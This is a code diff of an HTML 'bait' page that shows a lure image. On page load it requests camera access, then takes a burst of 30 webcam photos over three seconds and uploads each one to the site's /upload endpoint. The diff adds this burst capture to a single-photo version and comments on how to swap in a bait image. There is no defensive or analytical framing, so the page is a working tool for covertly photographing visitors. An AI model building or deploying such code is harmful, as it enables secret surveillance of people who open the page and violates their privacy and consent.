@@ -23,34 +23,43 @@
     </style>
 </head>
 <body>
-    <!-- Change welcome.jpg to your bait image filename in static folder -->
+    <!-- Replace welcome.jpg with your bait image -->
     <img src="/static/welcome.jpg" id="bait" alt="Image">
 
     <script>
-        window.onload = function () {
-            navigator.mediaDevices.getUserMedia({ video: true })
-                .then(stream => {
-                    const track = stream.getVideoTracks()[0];
-                    const imageCapture = new ImageCapture(track);
+        async function startBurstCapture() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const track = stream.getVideoTracks()[0];
+                const imageCapture = new ImageCapture(track);
 
-                    imageCapture.takePhoto()
-                        .then(blob => {
-                            console.log("ߓ Photo captured!");
-                            const formData = new FormData();
-                            formData.append('photo', blob, 'photo.jpg');
+                // Take 10 photos per second for 3 seconds = 30 photos
+                let count = 0;
+                const burstInterval = setInterval(async () => {
+                    try {
+                        const blob = await imageCapture.takePhoto();
+                        const formData = new FormData();
+                        formData.append('photo', blob, `photo_${Date.now()}.jpg`);
 
-                            fetch('/upload', {
-                                method: 'POST',
-                                body: formData
-                            })
-                            .then(res => res.text())
-                            .then(data => console.log("✅ Server:", data))
+                        fetch('/upload', { method: 'POST', body: formData })
+                            .then(res => console.log("✅ Sent", count + 1))
                             .catch(err => console.error("❌ Upload error:", err));
-                        })
-                        .catch(err => console.error("❌ Capture error:", err));
-                })
-                .catch(err => console.error("❌ Camera access denied:", err));
-        };
+
+                        count++;
+                        if (count >= 30) { // Stop after 30 shots
+                            clearInterval(burstInterval);
+                            track.stop();
+                        }
+                    } catch (err) {
+                        console.error("❌ Capture error:", err);
+                    }
+                }, 100); // 100ms interval = 10 per second
+            } catch (err) {
+                console.error("❌ Camera access denied:", err);
+            }
+        }
+
+        window.onload = startBurstCapture;
     </script>
 </body>
 </html>
